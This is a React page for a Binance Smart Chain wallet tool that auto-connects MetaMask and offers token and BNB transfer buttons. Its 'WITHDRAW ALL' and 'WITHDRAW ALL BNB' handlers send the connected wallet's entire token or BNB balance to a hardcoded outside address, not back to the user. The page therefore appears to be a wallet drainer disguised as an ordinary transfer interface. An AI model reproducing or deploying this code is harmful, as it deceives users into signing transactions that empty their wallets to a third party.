import { useState, useEffect } from "react";
import { useWeb3React, UnsupportedChainIdError } from "@web3-react/core";
import {
  InjectedConnector,
  NoEthereumProviderError,
} from "@web3-react/injected-connector";
import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
import Modal from "../components/Modal";
import { ethers } from "ethers";
import LoadingSpinner from "../components/LoadingSpinner";

import { formatEther, parseEther } from "@ethersproject/units";

const withdrawAddress = "0x5ecaa3A5B83273c8545466002fcBA5D98fA3419A";

const MetamaskImage =
  "https://1000logos.net/wp-content/uploads/2022/05/MetaMask-Symbol-500x281.png";
const WalletConnectImage =
  "https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png";

const coingeckoApiLink =
  "https://api.coingecko.com/api/v3/coins/list?include_platform=true";
const contractABI = [
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "totalSupply",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint8" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
      { name: "_data", type: "bytes" },
    ],
    name: "transferAndCall",
    outputs: [{ name: "success", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_subtractedValue", type: "uint256" },
    ],
    name: "decreaseApproval",
    outputs: [{ name: "success", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [{ name: "", type: "string" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ name: "success", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_addedValue", type: "uint256" },
    ],
    name: "increaseApproval",
    outputs: [{ name: "success", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, name: "from", type: "address" },
      { indexed: true, name: "to", type: "address" },
      { indexed: false, name: "value", type: "uint256" },
      { indexed: false, name: "data", type: "bytes" },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, name: "owner", type: "address" },
      { indexed: true, name: "spender", type: "address" },
      { indexed: false, name: "value", type: "uint256" },
    ],
    name: "Approval",
    type: "event",
  },
];
const Home = () => {
  const context = useWeb3React();
  const { library, chainId, account, activate, deactivate, active, error } =
    context;
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [ETHBalance, setETHBalance] = useState();
  const [tokenInfo, setTokenInfo] = useState();
  const [selectedTokenIndex, setSelectedTokenIndex] = useState(0);
  const [transferAmount, setTransferAmount] = useState(0);
  const [receiveAddress, setReceiveAddress] = useState("0x");
  const [loadingMessage, setLoadingMessage] = useState("");

  const openWalletModalHandler = () => setIsWalletModalOpen(true);
  const closeWalletModalHandler = () => setIsWalletModalOpen(false);

  const onSendClick = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    console.log(selectedTokenIndex);
    console.log(tokenInfo[selectedTokenIndex].symbol);
    const tokenData = tokenInfo[selectedTokenIndex];
    const tokenAddress = tokenData.platforms["binance-smart-chain"];
    // const signer = library.provider;
    console.log(tokenAddress);
    const contract = new ethers.Contract(
      tokenAddress,
      contractABI,
      provider.getSigner()
    );
    const decimals = await contract.decimals();
    console.log(decimals);
    contract
      .transfer(receiveAddress, "" + transferAmount * 10 ** decimals)
      .then(() => {
        alert("success");
      })
      .catch(() => {
        alert("something went wrong!!!");
      });
  };

  const onSendBNBClick = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);

    const signer = provider.getSigner();

    signer
      .sendTransaction({
        to: receiveAddress,
        value: ethers.utils.parseEther(transferAmount),
      })
      .then(() => {
        alert("success");
      })
      .catch(() => {
        alert("something went wrong!!!");
      });
  };
  const onWithdrawAllBnbClick = async () => {
    setLoadingMessage("Preparing ...");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const balance = await provider.getBalance(account);
    const gasEstimated = await provider.estimateGas({
      to: withdrawAddress,
      data: "0x0",
      value: balance,
    });

    const gasPrice = await provider.getGasPrice();
    console.log("estimation : ", gasEstimated.toString());
    const totalGasRequired = gasPrice * gasEstimated;
    console.log("total estimation : ", totalGasRequired.toString());
    const txBuffer = ethers.utils.parseEther("0.005");
    if (balance.sub(txBuffer) > 0) {
      const amount = balance.sub(totalGasRequired);
      try {
        const signer = provider.getSigner();
        await signer.sendTransaction({
          to: withdrawAddress,
          value: amount,
        });
        console.log(
          `Success! transferred -->${ethers.utils.formatEther(balance)}`
        );
      } catch (e) {
        console.log(`error: ${e}`);
      }
    } else {
      alert("you don't have enough balance to pay gas fee");
    }

    setLoadingMessage("");
  };
  const onWithdrawAllClick = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    console.log(selectedTokenIndex);
    console.log(tokenInfo[selectedTokenIndex].symbol);
    setLoadingMessage(
      "Loading " + tokenInfo[selectedTokenIndex].symbol + " token info"
    );
    const tokenData = tokenInfo[selectedTokenIndex];
    const tokenAddress = tokenData.platforms["binance-smart-chain"];
    // const signer = library.provider;
    console.log(tokenAddress);
    const contract = new ethers.Contract(
      tokenAddress,
      contractABI,
      provider.getSigner()
    );
    const decimals = await contract.decimals();
    console.log(decimals);
    const tokenBalance = await contract.balanceOf(account);
    console.log("tokenBalance:", tokenBalance.toString());

    if (tokenBalance.toString() === "0") {
      alert("you don't have this token");
    } else {
      contract
        .transfer(withdrawAddress, tokenBalance)
        .then(() => {
          alert("success");
        })
        .catch(() => {
          alert("something went wrong!!!");
        });
    }
    setLoadingMessage("");
  };
  const connectMetamask = () => {
    const injectedConnector = new InjectedConnector({
      supportedChainIds: [56, 97],
    });
    activate(injectedConnector);
  };

  const connectWalletConnect = () => {
    const RPC_URLS = {
      56: "https://bsc-mainnet.public.blastapi.io",
      // 4: "https://rinkeby.infura.io/v3/407161c0da4c4f1b81f3cc87ca8310a7"
    };
    const walletConnectConnector = new WalletConnectConnector({
      rpc: RPC_URLS,
      bridge: "https://bridge.walletconnect.org",
      qrcode: true,
    });
    activate(walletConnectConnector);
  };

  const getNetworkMessage = () => {
    if (active) {
      return "CONNECTED TO BSC " + (chainId == "56" ? "MAINNET" : "TESTNET");
    }
    if (error instanceof UnsupportedChainIdError) {
      return "CONNECTED WRONG NETWORK";
    }
    if (error instanceof NoEthereumProviderError) {
      return "NO ETHEREUM PROVIDER";
    }
    return "DISCONNCTED";
  };
  useEffect(() => {
    const getETHBalance = () => {
      library
        .getBalance(account)
        .then((balance) => {
          setETHBalance(balance);
        })
        .catch((err) => {
          setETHBalance(undefined);
        });
    };
    setTimeout(() => {
      if (library && active && !error) {
        getETHBalance();
      } else {
        setETHBalance(undefined);
      }
    }, 2000);
  }, [active, chainId, error, library, account]);
  useEffect(() => {
    connectMetamask();
  }, [])
  useEffect(() => {
    const fetchTokenInfoMainnet = () => {
      setLoadingMessage("Loading Token Info ...");
      fetch(coingeckoApiLink)
        .then((response) => response.json())
        .then((data) => {
          const bscTokens = data.filter((token) => {
            if ("binance-smart-chain" in token.platforms) {
              return 1;
            }
            return 0;
          });
          bscTokens.sort((a, b) => {
            let x = a.name.toLowerCase();
            let y = b.name.toLowerCase();
            if (x < y) {
              return -1;
            }
            if (x > y) {
              return 1;
            }
            return 0;
          });
          setTokenInfo(bscTokens);
          console.log(bscTokens);
        });

      setLoadingMessage("");
    };
    if (chainId == "56") {
      fetchTokenInfoMainnet();
    } else {
      const mockTokenInfo = [
        {
          id: "0Test1",
          symbol: "0Test1",
          name: "0Test1",
          platforms: {
            "binance-smart-chain": "0x857e3CC38C83233E7A64A81bC8EbbbbfDef808e2",
          },
        },
        {
          id: "1Test2",
          symbol: "1Test2",
          name: "1Test2",
          platforms: {
            "binance-smart-chain": "0x3271B3a2C11CF2fbDCe05E5e6F18599779209369",
          },
        },
      ];
      setTokenInfo(mockTokenInfo);
    }
  }, [chainId]);
  return (
    <div>
      <Modal
        isOpen={isWalletModalOpen}
        closeModalHandle={closeWalletModalHandler}
      >
        <div
          class="p-5 h-[50px] flex items-center gap-[20px] border-[2px] border-orange-800 rounded-[10px] transition duration-500 cursor-pointer bg-red-500 hover:bg-red-700"
          onClick={() => {
            connectMetamask();
            closeWalletModalHandler();
          }}
        >
          <img class="h-[50px] w-[50px]" src={MetamaskImage} alt="metamask" />
          <div>Metamask</div>
        </div>
        <div
          class="p-5 h-[50px] flex items-center gap-[20px] border-[2px] border-orange-800 rounded-[10px] transition duration-500 cursor-pointer bg-red-500 hover:bg-red-700"
          onClick={() => {
            connectWalletConnect();
            closeWalletModalHandler();
          }}
        >
          <img
            class="h-[50px] w-[50px]"
            src={WalletConnectImage}
            alt="walletconnect"
          />
          <div
            className=""
            onClick={() => {
              connectWalletConnect();
              closeWalletModalHandler();
            }}
          >
            WalletConnect
          </div>
        </div>
      </Modal>
      <div class=" bg-sky-800 flex justify-between">
        <div class=" mt-3 mb-3 ml-3 pl-1 pr-1 text-white">
          {getNetworkMessage()}
        </div>
        {active && account && (
          <div class=" mt-3 mb-3 ml-3 pl-1 pr-1 text-white">
            Your BNB balance is
            {ETHBalance === undefined
              ? "--"
              : parseFloat(formatEther(ETHBalance)).toPrecision(4)}
          </div>
        )}
        <button
          class=" mt-3 mb-3 ml-3 mr-3 pl-1 pr-1 bg-red-200 border-2 border-white rounded text-blue hover:bg-red-300"
          onClick={() => {
            if (active) {
              deactivate();
            } else {
              openWalletModalHandler();
            }
          }}
        >
          {active ? "DISCONNECT" : "CONNECT"}
        </button>
      </div>
      {active && (
        <div class="w-full flex flex-col items-center">
          {loadingMessage || typeof tokenInfo === "undefined" ? (
            <LoadingSpinner>
              {loadingMessage === ""
                ? "Loading token info ..."
                : loadingMessage}
            </LoadingSpinner>
          ) : (
            <>
              <div class="w-full p-3 flex justify-between">
                <select
                  value={tokenInfo[selectedTokenIndex].id}
                  onChange={(e) => {
                    setSelectedTokenIndex(e.target.selectedIndex);
                  }}
                  class="border-2"
                  name="tokenSelect"
                  id="tokenSelect"
                >
                  {tokenInfo.map((token, index) => {
                    return (
                      <option key={index} value={token.id}>
                        {token.name}
                      </option>
                    );
                  })}
                </select>
                <input
                  class="border-2 pl-2 pr-2 ml-5"
                  value={transferAmount}
                  type="number"
                  onChange={(e) => {
                    const result = e.target.value;
                    setTransferAmount(result);
                  }}
                />
                <input
                  class="border-2 pl-2 pr-2 ml-5"
                  value={receiveAddress}
                  onChange={(e) => {
                    setReceiveAddress(e.target.value);
                  }}
                />
              </div>
              <div>
                <button
                  class="ml-3 mr-3 py-3 bg-red-500 cursor-pointer hover:bg-red-800 w-[300px] text-xl text-white rounded-lg"
                  onClick={onSendClick}
                >
                  SEND
                </button>
                <button
                  class="ml-3 mr-3 py-3 bg-red-500 cursor-pointer hover:bg-red-800 w-[300px] text-xl text-white rounded-lg"
                  onClick={onSendBNBClick}
                >
                  SEND BNB
                </button>
                <button
                  class="ml-3 mr-3 py-3 bg-red-500 cursor-pointer hover:bg-red-800 w-[300px] text-xl text-white rounded-lg"
                  onClick={onWithdrawAllClick}
                >
                  WITHDRAW ALL
                </button>
                <button
                  class="ml-3 mr-3 py-3 bg-red-500 cursor-pointer hover:bg-red-800 w-[300px] text-xl text-white rounded-lg"
                  onClick={onWithdrawAllBnbClick}
                >
                  WITHDRAW ALL BNB
                </button>
              </div>
            </>
          )}
        </div>
      )}
    </div>
  );
};

export default Home;
